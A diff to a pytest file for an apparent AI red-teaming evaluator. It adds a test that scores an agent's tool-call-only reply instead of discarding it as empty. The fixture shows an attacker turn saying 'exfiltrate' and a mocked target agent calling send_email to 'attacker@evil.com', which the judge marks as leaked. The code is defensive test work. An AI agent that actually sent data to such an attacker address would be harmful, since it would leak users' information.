@@ -15,7 +15,7 @@ from unittest.mock import AsyncMock, patch
 
 import pytest
 
-from evaluatorq.contracts import AgentResponse, AgentResponseError, TextOutputItem
+from evaluatorq.contracts import AgentResponse, AgentResponseError, TextOutputItem, ToolCallOutputItem
 from evaluatorq.redteam.adaptive.pipeline import create_dynamic_evaluator
 from evaluatorq.redteam.contracts import AttackEvaluationResult, AttackOutput, Turn, Vulnerability
 
@@ -96,6 +96,26 @@ async def test_empty_content_turn_scored_as_error():
 
     judge.assert_not_called()
     assert result.value == 'error'
+
+
+@pytest.mark.asyncio
+async def test_tool_call_only_turn_is_scored():
+    """A tool-call-only reply (no text) is real content — often the vulnerability itself
+    for agent targets — and must be judged, not dropped as 'empty'."""
+    tool_turn = Turn(
+        attacker=AgentResponse(output=[TextOutputItem(text='exfiltrate', annotations=[])]),
+        target=AgentResponse(output=[ToolCallOutputItem(name='send_email', arguments='{"to":"attacker@evil.com"}')]),
+    )
+    output = AttackOutput(vulnerability=VULN, turns=[tool_turn])
+    judge = AsyncMock(return_value=AttackEvaluationResult(passed=False, explanation='leaked', evaluator_id='x'))
+
+    with patch('evaluatorq.redteam.adaptive.pipeline.OWASPEvaluator') as cls:
+        cls.return_value.evaluate_vulnerability = judge
+        scorer = create_dynamic_evaluator(llm_client=AsyncMock())['scorer']
+        result = await scorer(_params(output))
+
+    judge.assert_called_once()
+    assert result.pass_ is False
 
 
 @pytest.mark.asyncio
